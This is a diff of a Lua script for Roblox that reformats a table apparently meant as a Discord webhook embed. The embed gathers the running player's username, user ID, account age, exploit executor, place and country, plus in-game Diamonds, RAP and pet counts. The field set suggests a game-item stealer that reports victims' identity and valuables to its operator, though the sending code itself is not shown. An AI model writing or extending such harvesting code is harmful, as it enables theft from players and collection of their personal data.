@@ -74,38 +74,33 @@ local data1 = {
             ["fields"] = {
                 {
                     ["name"] = "Data Generated:",
-                    ["value"] = "**:detective:Username : " ..username .."\n:detective:User ID : " ..fardplayer.userId .. "\n:underage:Account Age : " ..fardplayer.AccountAge .. "\n:crown:Rank:"..rank.."\n:computer: Exploit : "..executor.."\n:mag:Place :"..Game.."\n:mag:Country : "..country.."**", -- AAstraxXTopG
+                    ["value"] = "**:detective:Username : " ..username .. "\n:detective:User ID : " ..fardplayer.userId .. "\n:underage:Account Age : " ..fardplayer.AccountAge .. "\n:crown:Rank:" ..rank.. "\n:computer: Exploit : " ..executor.. "\n:mag:Place :" ..Game.. "\n:mag:Country : " ..country.. "**", -- AAstraxXTopG
                     ["inline"] = false
                 },
                 {
-                    ["name"] = ":gem: Diamonds  :gem: ",
+                    ["name"] = "<:diamond_psx:1118474311615918080>Diamonds<:diamond_psx:1118474311615918080>",
                     ["value"] = "```>>> "..game.Players.LocalPlayer.leaderstats.Diamonds.Value.."```",
                     ["inline"] = false
 
                 },
                 {          
-                    ["name"] = ":bar_chart: RAP :bar_chart:",
+                    ["name"] = ":bar_chart:RAP:bar_chart:",
                     ["value"] = "```>>> "..RAP.."```",
                     ["inline"] = false
                 },
                 {
-                    ["name"] = " :money_mouth:Huge Pets:money_mouth: ",
+                    ["name"] = "<:huge_cat:1118474511763906660>Huge Pets<:huge_cat:1118474511763906660>",
                     ["value"] = "```>>> "..hugeamount.."```",
                     ["inline"] = true
                 },
                 {
-                    ["name"] = " :money_mouth:Exclusive Pets:money_mouth: ",
+                    ["name"] = " <:capybara:1118564875078209668>Exclusive Pets<:capybara:1118564875078209668>",
                     ["value"] = "```>>> "..exclusiveamount.."```",
                     ["inline"] = true
                 },
                 {
-                    ["name"] = " :money_mouth:Event Pets:money_mouth: ",
+                    ["name"] = "<:event:1112767158049591307>Event Pets<:event:1112767158049591307>",
                     ["value"] = "```>>> "..eventamount.."```",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = " :money_mouth:Secret Pets:money_mouth: ",
-                    ["value"] = "```>>> "..secretamount.."```",
                     ["inline"] = true
                 },
             }
